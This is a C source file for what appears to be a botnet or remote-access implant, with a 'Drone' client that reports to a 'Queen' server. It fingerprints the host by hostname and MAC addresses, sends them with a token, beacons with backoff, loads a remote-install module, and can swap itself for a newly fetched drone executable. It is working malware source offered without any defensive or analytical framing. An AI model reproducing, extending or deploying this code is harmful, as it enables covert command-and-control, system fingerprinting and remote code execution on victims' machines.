#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/sem.h>

#include <time.h>
#include <string.h>

#include <stdio.h>  
#include <sys/ioctl.h>  
#include <net/if.h>  

#include <unistd.h>//gethostname  
#include <limits.h>//HOST_NAME_MAX   

//#define SSL 1

#include "common.h"
#include "hyp_conn_queen.h"
#include "hyp_mod_func.h"

static char * droneConf = 0;

int init_srv();
int connect_breath_srv(char *);

union semun  
{  
    int val;  
    struct semid_ds *buf;  
    unsigned short *arry;  
};  


int create_get_string(char * buff,int flag){

	//get hostname
    char HostName[HOST_NAME_MAX + 1] = {0};  
    gethostname(HostName, HOST_NAME_MAX + 1);

	sprintf (buff,"%s""index.php?token=%.32s&flag=%d&name=%s",QueenHostDir,droneConf,flag,HostName);

    //get host MAC addr
	#define MAXINTERFACES 16  
    int fd, interface;  
    struct ifreq buf[MAXINTERFACES]; 
    struct ifconf ifc;   
    char name[100] = {0}; 
    if((fd = socket(AF_INET, SOCK_DGRAM, 0)) >= 0)  
    {  
        int i = 0;  
        ifc.ifc_len = sizeof(buf);  
        ifc.ifc_buf = (caddr_t)buf;  
        if (!ioctl(fd, SIOCGIFCONF, (char *)&ifc))  
        {  
            interface = ifc.ifc_len / sizeof(struct ifreq);  
            //printf("interface num is %d\n", interface);  
            while (i < interface)  
            {  
                //printf("net device %s\n", buf[i].ifr_name);  
                if (!(ioctl(fd, SIOCGIFHWADDR, (char *)&buf[i])))  
                {  
                    sprintf(name, "&mac[]=%02X%02X%02X%02X%02X%02X",  
                        (unsigned char)buf[i].ifr_hwaddr.sa_data[0],  
                        (unsigned char)buf[i].ifr_hwaddr.sa_data[1],  
                        (unsigned char)buf[i].ifr_hwaddr.sa_data[2],  
                        (unsigned char)buf[i].ifr_hwaddr.sa_data[3],  
                        (unsigned char)buf[i].ifr_hwaddr.sa_data[4],  
                        (unsigned char)buf[i].ifr_hwaddr.sa_data[5]);  
					strcat (buff,name);
                }    
                i++;  
            }  
        }  
    }
	return 0;
}

int get_string_mod (char * buff,MODULE_LIST * DroneModuleList){
	char mod[50] = {0};
	memset (buff,0,1);
    while ((0 != DroneModuleList->Module_NO[0]) || (0 != DroneModuleList->Module_NO[1]) || (0 != DroneModuleList->Module_NO[2]) || (0 != DroneModuleList->Module_NO[3])){
        strcat (buff,"&mod[]=");
		char tmp[16];
		memcpy (tmp,(char *)DroneModuleList->Module_NO,16);
		sprintf(mod,"%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X",tmp[0],tmp[1],tmp[2],tmp[3],tmp[4],tmp[5],tmp[6],tmp[7],
 	                                                                             tmp[8],tmp[9],tmp[10],tmp[11],tmp[12],tmp[13],tmp[14],tmp[15]);
		strcat (buff,mod);
		DroneModuleList ++;
    }
    return 0;
}


int InheritModuleList(MODULE_LIST * dest,MODULE_LIST * src){
	while ((0 != src->Module_NO[0]) || (0 != src->Module_NO[1]) || (0 != src->Module_NO[2]) || 
		   (0 != src->Module_NO[3])){ 
		if (0 == src->Module_Base){ //ignore sys remained MID : Module_Base == nil
            
		}else{
            memcpy (dest,src,sizeof(MODULE_LIST));
			dest++; 		
		}
		src ++;	
	}    
    return 0;
}

char * eof_pos(char * src,size_t max){
    char * ret = 0;
	while (max){
        if (0 == *src){
			src ++;
			ret = src;
			break;
        }		
		src ++;
		max--;
    }
	return ret;
}

int exec(void **);

void * init(void **buff)
{    
    * buff = (void *) &exec;    
	DroneModuleList = malloc(DroneModuleListBuffSize + sizeof(MODULE_LIST));
	if (DroneModuleList){
		memset (DroneModuleList,0x00,DroneModuleListBuffSize + sizeof(MODULE_LIST));
        return DroneModuleList;
	}
	return (void *)-1;
}

void active_offline(uint32_t id,int32_t key){
	char buff[100] = {0};
	sprintf (buff,"%s""active_off.php?id=%d&uniqu=%d",QueenHostDir,id,key);	
    debug_msg ("\n active off : %s \n",buff);

	HYP_CONN_QUEEN_SOCKET send_hcqs;
	if (0 == hyp_conn_queen_init(buff,0,0,&send_hcqs,1,0)){ //强制设置 QueenSSL_nonBlock 为0, 即阻塞模式
		int i = 1;
		do{
			i = hyp_conn_queen_read(&send_hcqs,(char *)&buff,100,0); //强制设置 QueenSSL_nonBlock 为0, 即阻塞模式	
			//debug_msg ("\n active off hyp_conn_queen_read : %d \n",i);
		}while (i > 0);
		hyp_conn_queen_close(&send_hcqs);
	}    
    return;
}

int exec(void ** argv)//main()
{
	droneConf = * argv;

	#ifdef QueenSSL
		SSL_library_init();
	    SSL_load_error_strings();	
	#endif

	int32_t key;
	int sem_id;

	DroneID = 0;

    newDroneModuleList = 0;
    newDroneExec       = 0;
    
    int DroneMaxDelay = 15 * 60; // 15 分钟
    int DroneMinDelay = 5;       //   5 秒
        DroneStatus = 0;
	int CurrentDelay = 0;	
    
	//get Drone Configure
	unsigned short * Port = (unsigned short *)&(droneConf[32]);
	QueenHostPort = * Port;
	QueenDomainName = &(droneConf[34]);
	QueenHostName   = eof_pos(QueenDomainName,160);
	QueenHostDir    = eof_pos(QueenHostName,160);
	
	debug_msg ("DroneConf: %.32s , Port: %i \n""%s \n""%s \n""%s \n",droneConf,QueenHostPort,QueenDomainName,QueenHostName,QueenHostDir);

	key = 0;

	while (0 == key){
		srand( (unsigned)time( NULL ) );
		key = rand()%2147483647;

		sem_id = semget(key,1,IPC_CREAT | IPC_EXCL | 0600);

		if (-1 == sem_id){
			debug_msg("semget fail ! key: %d , wait...2 second...\n",key);
			sleep (2);
			key = 0;
		}else{
			debug_msg("semget success ! key: %d shmid: %d \n",key,sem_id);
		}	
	}    

    CurrentDelay = DroneMinDelay;
	while (0 != init_srv()){     
		debug_msg ("\ninit_srv fail , start to sleep (sec): %i \n",CurrentDelay);
		if (CurrentDelay < DroneMaxDelay){
		    CurrentDelay *= 2;
		}else{
		    CurrentDelay = DroneMaxDelay;
		}
	    sleep(CurrentDelay);
	};
	CurrentDelay = 0;

    debug_msg (" RequestBuffSize : %i \n",RequestBuffSize);
	debug_msg (" ResponseUnitSize: %i \n",ResponseUnitSize);
	debug_msg (" ResponseMaxSize : %i \n",ResponseMaxSize);

	
	char *buff = malloc(DroneSubmitBuffSize);
	//DroneModuleList = malloc(DroneModuleListBuffSize);

	if ((NULL == buff) || (NULL == DroneModuleList)){
		debug_msg("fatal error: malloc fail !\n");
	}else{      
        //memset (DroneModuleList,0x00,DroneModuleListBuffSize);
		memset (buff,0x00,DroneSubmitBuffSize);
		create_get_string(buff,key);
        uint32_t drone[4] = {0x0302010F,0x07060504,0x0B0A0908,0x100E0D0C}; //mod main (sys mid)
		mod_insert_list(DroneModuleList,(uint32_t *)&drone,&mod_drone,0,0);

        uint32_t mid[4] = {256,0,0,0}; //mod remote install (sys mid)
		mod_insert_list(DroneModuleList,(uint32_t *)&mid,&mod_remote_install,0,0);

		#ifdef DEBUG //add mod : test.so
            if (0 != mod_loc_loader("./test.so",0)){
			    debug_msg ("* fail to load test MOD \n");    
			}else{
			    debug_msg ("success to load test MOD \n");
			}
        #endif
		
        char * lpMod = buff + strlen(buff);

		while (1){			
			lpQueenSin = 0;
			lpQueenPpe = 0;

			//mod_loader (DroneModuleList);
			get_string_mod (lpMod,DroneModuleList);
			
			debug_msg (" buff : %s \n lpMod : %s \n",buff,lpMod);//printf(buff);
			//int org_get_buf_len = strlen(buff);

	        //init Drone's Status            
			connect_breath_srv(buff);

            if (-9 == DroneStatus) 
				break;

			switch (DroneStatus)
			{
			case -1:
            case -3:
			    DroneStatus --;
				CurrentDelay = DroneMinDelay;
				break;
            case -2:
            case -4:
			default:
				if (0 == CurrentDelay){
				    CurrentDelay = 1;
				}else{
					if (CurrentDelay < DroneMaxDelay){
						CurrentDelay *= 2;
					}else{
						CurrentDelay = DroneMaxDelay;
					}
				}
			    
			    break;
			}
			debug_msg ("\nDroneStatus: %i , start to sleep (sec): %i \n",DroneStatus,CurrentDelay);
			sleep(CurrentDelay);
		}		
	}
    
	if (NULL != buff){
		free(buff);		
	}

    if ((newDroneModuleList) && (newDroneExec)){ //copy DroneModuleList to new Drone's        
		InheritModuleList(newDroneModuleList,DroneModuleList);
    }else{                                       //release all MODs
		debug_msg ("\n mod close ...start...\n");
	    mod_close(DroneModuleList);
	}

	if (NULL != DroneModuleList){
		free(DroneModuleList);
	}

	union semun sem_union;
	semctl(sem_id, 0, IPC_RMID, sem_union);

    //notify Queen that current Drone offline
    active_offline(DroneID,key);
    debug_msg ("\n active off Finished\n");

	#ifdef QueenSSL
		ERR_free_strings();
	#endif

    if ((newDroneModuleList) && (newDroneExec)){ //new Drone need be run
        void (*exec) (void **);
		exec = newDroneExec;
		exec(argv);
    }
	return 0;
}
